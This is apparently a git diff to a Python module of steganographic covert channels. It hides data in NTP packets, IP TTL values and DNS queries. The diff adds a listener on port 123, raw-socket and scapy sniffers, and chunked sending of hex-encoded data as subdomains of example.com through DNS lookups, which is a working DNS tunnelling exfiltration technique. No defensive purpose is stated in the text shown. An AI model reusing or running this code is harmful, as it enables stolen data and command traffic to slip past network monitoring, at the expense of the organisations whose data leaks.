@@ -40,11 +40,14 @@ class SteganographicChannel(ABC):
 
 
 class NTPChannel(SteganographicChannel):
-    """Hide data in NTP packets."""
+    """Hide data in NTP packets with proper UDP listener."""
 
     def __init__(self):
         self.sock = None
         self.buffer = bytearray()
+        self.receive_socket = None
+        self.receive_task = None
+        self.packet_queue = asyncio.Queue()
 
     async def send_data(self, data: bytes, target: str) -> bool:
         """Send data hidden in NTP packet."""
@@ -63,13 +66,58 @@ class NTPChannel(SteganographicChannel):
         except Exception:
             return False
 
-    async def receive_data(self) -> Optional[bytes]:
-        """Extract data from NTP packet."""
-        if len(self.buffer) >= 48:  # NTP packet size
-            packet = bytes(self.buffer[:48])
-            self.buffer = self.buffer[48:]
-            return self._extract_from_ntp(packet)
-        return None
+    async def receive_data(self, timeout: float = 5.0) -> Optional[bytes]:
+        """Extract data from NTP packet using UDP listener."""
+        try:
+            # Start listener if not already running
+            if self.receive_socket is None:
+                await self._start_listener()
+
+            # Wait for packet from queue
+            try:
+                packet_data = await asyncio.wait_for(self.packet_queue.get(), timeout=timeout)
+                return self._extract_from_ntp(packet_data)
+            except asyncio.TimeoutError:
+                return None
+        except Exception as e:
+            logger.error(f"Error receiving NTP data: {e}")
+            return None
+
+    async def _start_listener(self):
+        """Start UDP listener for NTP packets."""
+        try:
+            self.receive_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            self.receive_socket.bind(("0.0.0.0", 123))
+            self.receive_socket.setblocking(False)
+
+            # Start background task to receive packets
+            self.receive_task = asyncio.create_task(self._receive_loop())
+            logger.debug("NTP channel listener started")
+        except OSError as e:
+            logger.warning(f"Could not bind to NTP port 123: {e}")
+            self.receive_socket = None
+
+    async def _receive_loop(self):
+        """Background loop to receive UDP packets."""
+        while self.receive_socket:
+            try:
+                loop = asyncio.get_event_loop()
+                data, addr = await loop.sock_recvfrom(self.receive_socket, 48)
+                if len(data) == 48:  # Valid NTP packet size
+                    await self.packet_queue.put(data)
+            except asyncio.CancelledError:
+                break
+            except Exception as e:
+                logger.debug(f"Error in NTP receive loop: {e}")
+                await asyncio.sleep(0.1)
+
+    def _stop_listener(self):
+        """Stop UDP listener."""
+        if self.receive_task:
+            self.receive_task.cancel()
+        if self.receive_socket:
+            self.receive_socket.close()
+            self.receive_socket = None
 
     def _create_ntp_packet(self, hidden_data: bytes) -> bytes:
         """Create NTP packet with hidden data."""
@@ -181,76 +229,30 @@ class TTLChannel(SteganographicChannel):
             logger.error("Error in TTL fallback send: %s", e)
             return False
 
-    async def receive_data(self) -> Optional[bytes]:
+    async def receive_data(self, timeout: float = 5.0) -> Optional[bytes]:
         """
         Extract data from received packets by analyzing TTL values.
 
-        Implements packet capture using scapy or raw sockets to read TTL values
+        Implements continuous packet capture using scapy or raw sockets to read TTL values
         from incoming IP packets and decode the hidden data.
         """
         if not SCAPY_AVAILABLE:
             # Fallback implementation using raw sockets
-            return await self._receive_data_fallback()
+            return await self._receive_data_fallback(timeout)
 
         try:
             # Use scapy to sniff packets and extract TTL values
-            from scapy.all import sniff, IP
+            from scapy.all import IP, sniff
 
-            # Sniff a single packet with timeout
-            packets = sniff(count=1, timeout=1.0, filter="ip", store=True)
+            # Sniff packets with timeout
+            packets = sniff(count=8, timeout=timeout, filter="ip", store=True, quiet=True)
 
             if not packets:
                 return None
 
-            packet = packets[0]
-            if IP in packet:
-                ttl = packet[IP].ttl
-                bit = self._extract_bit_from_ttl(ttl)
-
-                if bit is not None:
-                    self.received_bits.append(bit)
-
-                    # When we have 8 bits, convert to byte
-                    if len(self.received_bits) >= 8:
-                        byte_value = 0
-                        for i in range(8):
-                            if i < len(self.received_bits):
-                                byte_value |= self.received_bits[i] << i
-
-                        self.received_bits = self.received_bits[8:]
-                        return bytes([byte_value])
-
-            return None
-
-        except Exception as e:
-            logger.error(f"Error in TTL channel receive: {e}")
-            return None
-
-    async def _receive_data_fallback(self) -> Optional[bytes]:
-        """
-        Fallback implementation using raw sockets when scapy is not available.
-        Requires root/administrator privileges.
-        """
-        try:
-            # Create raw socket to capture IP packets
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
-                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
-                sock.setblocking(False)
-            except PermissionError:
-                logger.warning("Raw socket requires root privileges for TTL channel receive")
-                return None
-
-            # Try to receive a packet with timeout
-            loop = asyncio.get_event_loop()
-            try:
-                packet_data, addr = await asyncio.wait_for(
-                    loop.sock_recvfrom(sock, 65535), timeout=1.0
-                )
-
-                # Parse IP header to extract TTL (byte 8 in IP header)
-                if len(packet_data) >= 20:  # Minimum IP header size
-                    ttl = packet_data[8]
+            for packet in packets:
+                if IP in packet:
+                    ttl = packet[IP].ttl
                     bit = self._extract_bit_from_ttl(ttl)
 
                     if bit is not None:
@@ -266,8 +268,62 @@ class TTLChannel(SteganographicChannel):
                             self.received_bits = self.received_bits[8:]
                             return bytes([byte_value])
 
-            except asyncio.TimeoutError:
-                pass
+            return None
+
+        except Exception as e:
+            logger.error(f"Error in TTL channel receive: {e}")
+            return None
+
+    async def _receive_data_fallback(self, timeout: float = 5.0) -> Optional[bytes]:
+        """
+        Fallback implementation using raw sockets when scapy is not available.
+        Requires root/administrator privileges.
+        """
+        try:
+            # Create raw socket to capture IP packets
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_IP)
+                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+                sock.setblocking(False)
+            except PermissionError:
+                logger.warning("Raw socket requires root privileges for TTL channel receive")
+                return None
+
+            # Try to receive multiple packets with timeout
+            loop = asyncio.get_event_loop()
+            end_time = asyncio.get_event_loop().time() + timeout
+
+            try:
+                while asyncio.get_event_loop().time() < end_time:
+                    remaining_time = end_time - asyncio.get_event_loop().time()
+                    if remaining_time <= 0:
+                        break
+
+                    try:
+                        packet_data, addr = await asyncio.wait_for(
+                            loop.sock_recvfrom(sock, 65535), timeout=min(remaining_time, 1.0)
+                        )
+
+                        # Parse IP header to extract TTL (byte 8 in IP header)
+                        if len(packet_data) >= 20:  # Minimum IP header size
+                            ttl = packet_data[8]
+                            bit = self._extract_bit_from_ttl(ttl)
+
+                            if bit is not None:
+                                self.received_bits.append(bit)
+
+                                # When we have 8 bits, convert to byte
+                                if len(self.received_bits) >= 8:
+                                    byte_value = 0
+                                    for i in range(8):
+                                        if i < len(self.received_bits):
+                                            byte_value |= self.received_bits[i] << i
+
+                                    self.received_bits = self.received_bits[8:]
+                                    sock.close()
+                                    return bytes([byte_value])
+                    except asyncio.TimeoutError:
+                        continue
             finally:
                 sock.close()
 
@@ -285,86 +341,166 @@ class TTLChannel(SteganographicChannel):
 
 
 class DNSChannel(SteganographicChannel):
-    """Hide data in DNS queries."""
+    """Hide data in DNS queries with proper packet capture."""
 
     def __init__(self):
         self.domain_base = "example.com"
         self.received_queries = []
         self.query_buffer = bytearray()
+        self.sniffer_task = None
+        self.packet_queue = asyncio.Queue()
+        self.is_listening = False
 
     async def send_data(self, data: bytes, target: str) -> bool:
         """Send data in DNS subdomain."""
         try:
-            # Encode data as hex and create subdomain
-            hex_data = data.hex()
-            subdomain = f"{hex_data}.{self.domain_base}"
+            # Split data into chunks that fit in DNS subdomain (max 63 chars per label)
+            # Hex encoding doubles size, so max ~31 bytes per subdomain
+            chunk_size = 31
+            chunks = [data[i : i + chunk_size] for i in range(0, len(data), chunk_size)]
 
-            # Perform DNS lookup (this sends the data)
-            try:
-                socket.gethostbyname(subdomain)
-            except socket.gaierror:
-                pass  # Expected for non-existent domains
+            for chunk in chunks:
+                hex_data = chunk.hex()
+                subdomain = f"{hex_data}.{self.domain_base}"
+
+                # Perform DNS lookup (this sends the data)
+                try:
+                    socket.gethostbyname(subdomain)
+                    await asyncio.sleep(0.1)  # Small delay between queries
+                except socket.gaierror:
+                    pass  # Expected for non-existent domains
 
             return True
-        except Exception:
+        except Exception as e:
+            logger.error(f"Error sending DNS steganographic data: {e}")
             return False
 
-    async def receive_data(self) -> Optional[bytes]:
-        """
-        Extract data from DNS query logs or by monitoring DNS traffic.
+    async def receive_data(self, timeout: float = 5.0) -> Optional[bytes]:
+        """Extract data from DNS queries using packet capture."""
+        try:
+            # Start sniffer if not already running
+            if not self.is_listening:
+                await self._start_sniffer()
 
-        In a real implementation, this would:
-        1. Monitor DNS queries (via DNS server logs, packet capture, or DNS monitoring)
-        2. Extract subdomain data from queries matching our domain pattern
-        3. Decode hex data from subdomain names
-        4. Return reconstructed bytes
-        """
-        # Check if we have buffered data
-        if len(self.query_buffer) > 0:
-            # Return first available chunk
-            data = bytes(self.query_buffer)
-            self.query_buffer = bytearray()
-            return data
-
-        # In production, this would monitor DNS queries
-        # For now, we can use a DNS packet sniffer if scapy is available
-        if SCAPY_AVAILABLE:
+            # Wait for packet from queue
             try:
-                from scapy.all import sniff, DNS
+                decoded_data = await asyncio.wait_for(self.packet_queue.get(), timeout=timeout)
+                return decoded_data
+            except asyncio.TimeoutError:
+                return None
+        except Exception as e:
+            logger.error(f"Error receiving DNS data: {e}")
+            return None
 
-                # Sniff DNS packets with timeout
-                packets = sniff(count=1, timeout=1.0, filter="udp port 53", store=True)
+    async def _start_sniffer(self):
+        """Start DNS packet sniffer in background."""
+        if self.is_listening:
+            return
 
-                if not packets:
-                    return None
-
-                packet = packets[0]
-                if DNS in packet and packet[DNS].qr == 0:  # DNS query (not response)
-                    qname = packet[DNS].qname.decode("utf-8", errors="ignore").rstrip(".")
-
-                    # Check if query matches our domain pattern
-                    if self.domain_base in qname:
-                        # Extract hex data from subdomain
-                        subdomain = qname.split(".")[0]
-                        try:
-                            # Try to decode hex data
-                            hex_data = subdomain
-                            decoded = bytes.fromhex(hex_data)
-                            return decoded
-                        except ValueError:
-                            # Not valid hex, skip
-                            pass
-
+        if SCAPY_AVAILABLE:
+            self.is_listening = True
+            self.sniffer_task = asyncio.create_task(self._sniff_loop())
+            logger.debug("DNS channel sniffer started")
+        else:
+            # Fallback: Use raw socket to capture DNS packets
+            try:
+                self.is_listening = True
+                self.sniffer_task = asyncio.create_task(self._raw_socket_sniff())
+                logger.debug("DNS channel raw socket sniffer started")
             except Exception as e:
-                logger.debug(f"Error in DNS channel receive: {e}")
+                logger.warning(f"Could not start DNS sniffer: {e}")
+                self.is_listening = False
 
-        # Alternative: Monitor local DNS cache or query logs
-        # This would require platform-specific implementations
-        # For Windows: Could monitor DNS cache via ipconfig /displaydns
-        # For Linux: Could monitor /var/log/syslog or systemd-resolved logs
-        # For now, return None if no data available
+    async def _sniff_loop(self):
+        """Background loop to sniff DNS packets using scapy."""
+        while self.is_listening:
+            try:
+                from scapy.all import DNS, sniff
 
-        return None
+                # Sniff DNS packets with short timeout
+                packets = sniff(count=1, timeout=1.0, filter="udp port 53", store=True, quiet=True)
+
+                if packets:
+                    packet = packets[0]
+                    if DNS in packet and packet[DNS].qr == 0:  # DNS query (not response)
+                        qname = packet[DNS].qname.decode("utf-8", errors="ignore").rstrip(".")
+
+                        # Check if query matches our domain pattern
+                        if self.domain_base in qname:
+                            subdomain = qname.split(".")[0]
+                            try:
+                                # Try to decode hex data
+                                decoded = bytes.fromhex(subdomain)
+                                await self.packet_queue.put(decoded)
+                            except ValueError:
+                                pass  # Not valid hex, skip
+
+                await asyncio.sleep(0.1)  # Small delay to prevent CPU spinning
+            except asyncio.CancelledError:
+                break
+            except Exception as e:
+                logger.debug(f"Error in DNS sniff loop: {e}")
+                await asyncio.sleep(1.0)
+
+    async def _raw_socket_sniff(self):
+        """Fallback DNS packet capture using raw socket."""
+        try:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
+            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
+            sock.setblocking(False)
+
+            loop = asyncio.get_event_loop()
+            while self.is_listening:
+                try:
+                    packet_data, addr = await asyncio.wait_for(
+                        loop.sock_recvfrom(sock, 65535), timeout=1.0
+                    )
+
+                    # Parse UDP header (starts at byte 20 after IP header)
+                    if len(packet_data) >= 28:
+                        src_port = struct.unpack("!H", packet_data[20:22])[0]
+                        dst_port = struct.unpack("!H", packet_data[22:24])[0]
+
+                        # Check if this is DNS (port 53)
+                        if src_port == 53 or dst_port == 53:
+                            # Parse DNS query (simplified)
+                            dns_data = packet_data[28:]
+                            if len(dns_data) > 12:
+                                # Extract query name (simplified parsing)
+                                qname_end = dns_data.find(b"\x00", 12)
+                                if qname_end > 12:
+                                    qname_bytes = dns_data[12:qname_end]
+                                    try:
+                                        qname = qname_bytes.decode("utf-8", errors="ignore")
+                                        if self.domain_base in qname:
+                                            subdomain = qname.split(".")[0]
+                                            try:
+                                                decoded = bytes.fromhex(subdomain)
+                                                await self.packet_queue.put(decoded)
+                                            except ValueError:
+                                                pass
+                                    except Exception:
+                                        pass
+                except asyncio.TimeoutError:
+                    continue
+                except PermissionError:
+                    logger.warning("Raw socket requires root privileges for DNS capture")
+                    break
+                except Exception as e:
+                    logger.debug(f"Error in raw socket DNS sniff: {e}")
+                    await asyncio.sleep(1.0)
+
+            sock.close()
+        except PermissionError:
+            logger.warning("Raw socket requires root privileges")
+        except Exception as e:
+            logger.error(f"Error starting raw socket DNS sniffer: {e}")
+
+    def _stop_sniffer(self):
+        """Stop DNS packet sniffer."""
+        self.is_listening = False
+        if self.sniffer_task:
+            self.sniffer_task.cancel()
 
 
 class ChannelManager:
@@ -383,14 +519,24 @@ class ChannelManager:
 
         return await self.channels[channel_name].send_data(data, target)
 
-    async def receive_data(self, channel: Optional[str] = None) -> Optional[bytes]:
+    async def receive_data(
+        self, channel: Optional[str] = None, timeout: float = 5.0
+    ) -> Optional[bytes]:
         """Receive data from specified or active channel."""
         channel_name = channel or self.active_channel
 
         if channel_name not in self.channels:
             return None
 
-        return await self.channels[channel_name].receive_data()
+        return await self.channels[channel_name].receive_data(timeout)
+
+    async def stop_all_listeners(self):
+        """Stop all active listeners in channels."""
+        for channel in self.channels.values():
+            if hasattr(channel, "_stop_listener"):
+                channel._stop_listener()
+            if hasattr(channel, "_stop_sniffer"):
+                channel._stop_sniffer()
 
     def switch_channel(self, channel: str):
         """Switch active channel."""
